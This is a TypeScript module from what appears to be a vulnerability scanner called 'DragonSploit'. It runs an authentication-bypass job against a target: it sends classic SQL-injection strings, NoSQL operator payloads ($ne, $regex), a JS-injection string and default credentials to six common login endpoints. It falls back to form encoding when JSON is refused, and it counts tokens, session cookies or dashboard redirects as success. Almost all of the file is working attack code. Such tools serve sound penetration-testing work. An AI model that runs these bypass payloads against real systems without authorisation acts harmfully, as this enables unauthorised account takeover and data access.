import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import axios from 'axios';
import { URL, URLSearchParams } from 'url'; // ✅ استيراد URLSearchParams
import { recordVulnerability } from './common';

// ✅ تعريف نوع أكثر دقة للحمولات للسماح بالكائنات المتداخلة
type PayloadValue = string | { [key: string]: any };
interface BypassPayload {
    email: PayloadValue;
    password: PayloadValue;
}

export async function executeAuthBypassAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 0] Starting Authentication Bypass Attack...');
    let found = false;

    const loginEndpoints = [
        '/rest/user/login',
        '/api/login',
        '/login',
        '/signin',
        '/auth/login',
        '/api/v1/auth/login'
    ];

    const bypassTechniques: { name: string; payload: BypassPayload }[] = [
        // --- Classic SQLi Bypasses ---
        { name: "Classic SQLi", payload: { email: "' OR 1=1 --", password: "password" } },
        { name: "Tautology (Username)", payload: { email: "admin'--", password: "password" } },
        { name: "Tautology (Password)", payload: { email: "admin", password: "' OR 1=1 --" } },
        { name: "UNION-Based (assuming 3 columns)", payload: { email: "' UNION SELECT 1, 'admin', 'password_hash' --", password: "password" } },
        
        // --- NoSQL Injection Bypasses (Critical for modern apps) ---
        { name: "NoSQLi (Not Equal)", payload: { email: { "$ne": "nonexistent" }, password: { "$ne": "nonexistent" } } },
        { name: "NoSQLi (Regex)", payload: { email: { "$regex": ".*" }, password: { "$regex": ".*" } } },
        { name: "NoSQLi (WHERE clause JS injection)", payload: { email: "' && this.password.length > 0 && '1'=='1", password: "password" } },

        // --- Other Logical Flaws ---
        { name: "Admin Account Guess", payload: { email: "admin", password: "admin" } },
        { name: "Empty Password", payload: { email: "admin", password: "" } },
        { name: "Wildcard Login", payload: { email: "*", password: "*" } }
    ];

    for (const path of loginEndpoints) {
        const loginUrl = new URL(path, targetUrl).toString();
        console.log(`[Vector 0] Testing endpoint: ${loginUrl}`);

        for (const technique of bypassTechniques) {
            try {
                // Try JSON content type first
                let response = await axios.post(loginUrl, technique.payload, {
                    headers: { 
                        'User-Agent': 'DragonSploit/2.0',
                        'Content-Type': 'application/json'
                    },
                    validateStatus: () => true,
                    // زيادة المهلة للتعامل مع الخوادم البطيئة
                    timeout: 10000, 
                });

                // If JSON fails (e.g., 415 Unsupported Media Type), try form-urlencoded
                if (response.status === 415) {
                    const formData = new URLSearchParams();
                    // ✅✅✅ الإصلاح الحاسم ✅✅✅
                    // حلقة آمنة من ناحية الأنواع للتعامل مع الحمولات المعقدة
                    for (const key of Object.keys(technique.payload) as Array<keyof BypassPayload>) {
                        const value = technique.payload[key];
                        if (typeof value === 'string') {
                            formData.append(key, value);
                        } else {
                            // إذا كانت القيمة كائناً (لحالة NoSQLi)، قم بتحويلها إلى JSON string
                            formData.append(key, JSON.stringify(value));
                        }
                    }
                    response = await axios.post(loginUrl, formData.toString(), {
                        headers: { 
                            'User-Agent': 'DragonSploit/2.0',
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        validateStatus: () => true,
                        timeout: 10000,
                    });
                }

                // Intelligent Success Detection
                const hasToken = response.data?.token || response.data?.authentication?.token || response.data?.access_token;
                const hasSession = response.headers['set-cookie']?.some(cookie => 
                    /session|connect\.sid|jsessionid/i.test(cookie)
                );
                const isRedirectToDashboard = response.status >= 300 && response.status < 400 && response.headers.location?.match(/dashboard|account|home/i);
                
                // ✅ إصلاح المشكلة المنطقية
                const hasWelcomeMessage = response.data && typeof response.data === 'string' && response.data.toLowerCase().match(/welcome|logged in as/i);

                if (hasToken || hasSession || isRedirectToDashboard || hasWelcomeMessage) {
                    console.log(`[Vector 0] ✅ Authentication Bypass SUCCESS with technique: "${technique.name}"`);
                    const proof = `Endpoint: ${loginUrl}\nTechnique: ${technique.name}\nPayload: ${JSON.stringify(technique.payload)}\nResponse Snippet: ${JSON.stringify(response.data).substring(0, 200)}...`;
                    const description = `Logical Authentication Bypass confirmed using ${technique.name}. Access granted.`;
                    await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
                    found = true;
                    return found; // Stop after first success
                }
            } catch (error: any) {
                console.log(`[Vector 0] ⚠️ Error with technique ${technique.name} on ${loginUrl}: ${error.message}`);
            }
        }
    }
    return found;
}
